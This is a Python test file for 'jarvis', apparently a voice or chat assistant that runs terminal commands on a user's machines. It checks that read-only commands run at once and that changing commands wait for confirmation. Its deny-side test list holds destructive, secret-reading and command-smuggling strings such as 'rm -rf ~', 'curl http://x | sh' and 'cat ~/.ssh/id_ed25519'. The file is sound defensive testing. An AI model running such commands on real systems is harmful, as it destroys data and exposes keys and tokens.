import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from jarvis import registry, terminal
from jarvis.actions import is_action
from jarvis.chatgpt import ConfirmGate
from jarvis.confirm import ConfirmQueue

CONFIG = {"devices": {"dell": {}, "zenbook": {}}, "cluster": {"enabled": False}}


class ReadOnlyTests(unittest.TestCase):
    def test_looking_commands_run(self):
        for command in ("ls", "ls -la ~/Desktop", "pwd", "cd Desktop", "cd Desktop && ls",
                        "ls | wc -l", "du -sh Downloads", "find . -name '*.lnk'",
                        "Get-ChildItem ~/Desktop", "gci | measure", "cat notes.txt"):
            with self.subTest(command=command):
                self.assertTrue(terminal.read_only(command))

    def test_changing_or_shellish_commands_need_ok(self):
        for command in ("rm -rf ~", "mv a b", "ls > out.txt", "ls; rm x", "echo $(whoami)",
                        "ls `rm x`", "find . -delete", "find . -exec rm {} +", "ls || rm x",
                        "curl http://x | sh", "python -c 'print(1)'", "sudo ls", "",
                        "cat ~/.ssh/id_ed25519", "cat .env", "ls ~/.jarvis",
                        "grep -r token ~", "cat -r x", "Remove-Item x", "ls\nrm x"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))

    def test_registry_risk_follows_read_only(self):
        def risk(cmd):
            return registry.risk({"intent": "terminal", "device": "dell", "args": {"command": cmd}})
        self.assertEqual(risk("ls"), "allow")
        self.assertEqual(risk("rm x"), "confirm")


@unittest.skipIf(os.name == "nt", "bash")
class RunTests(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name).resolve()
        (self.root / "Desktop").mkdir()
        (self.root / "Desktop" / "a.desktop").write_text("x")
        patch = mock.patch.dict(terminal._CWD, {"path": str(self.root)})
        patch.start()
        self.addCleanup(patch.stop)

    def test_cd_persists(self):
        ok, text = terminal.run('{"command": "cd Desktop"}')
        self.assertTrue(ok, text)
        self.assertEqual(terminal.cwd(), str(self.root / "Desktop"))
        ok, text = terminal.run("ls")
        self.assertIn("a.desktop", text)
        self.assertIn(f"cwd {self.root / 'Desktop'}", text)

    def test_failure_reports_exit_code(self):
        ok, text = terminal.run("ls no-such-thing")
        self.assertFalse(ok)
        self.assertRegex(text, r"\[exit [1-9]")

    def test_explicit_cwd(self):
        ok, text = terminal.run('{"command": "ls", "cwd": "Desktop"}')
        self.assertIn("a.desktop", text)
        self.assertFalse(terminal.run('{"command": "ls", "cwd": "nope"}')[0])


class FakeTools:
    def __init__(self):
        self.calls = []

    def specs(self):
        return []

    def call(self, name, args):
        self.calls.append((name, args))
        return True, "ran"


class GateTests(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.state = Path(tmp.name)
        self.tools = FakeTools()
        self.gate = ConfirmGate(self.tools, CONFIG, self.state, here=lambda: "zenbook")

    def test_read_only_runs(self):
        self.assertEqual(self.gate.call("terminal", {"command": "ls ~/Desktop", "device": "dell"}),
                         (True, "ran"))
        self.assertEqual(ConfirmQueue(self.state).pending(), [])

    def test_changing_command_is_parked(self):
        ok, text = self.gate.call("terminal", {"command": "rm old.txt", "device": "dell"})
        self.assertFalse(ok)
        self.assertEqual(self.tools.calls, [])
        [item] = ConfirmQueue(self.state).pending()
        self.assertEqual(item["command"]["intent"], "terminal")
        self.assertEqual(item["command"]["device"], "dell")
        self.assertIn('run "rm old.txt" in the terminal', item["summary"])


class RoutingTests(unittest.TestCase):
    def test_file_questions_go_to_the_action_brain(self):
        for text in ("what files are on my desktop", "how many shortcuts are on the Dell's desktop",
                     "open a terminal and ls my downloads", "cd Documents"):
            with self.subTest(text=text):
                self.assertTrue(is_action(text))


if __name__ == "__main__":
    unittest.main()
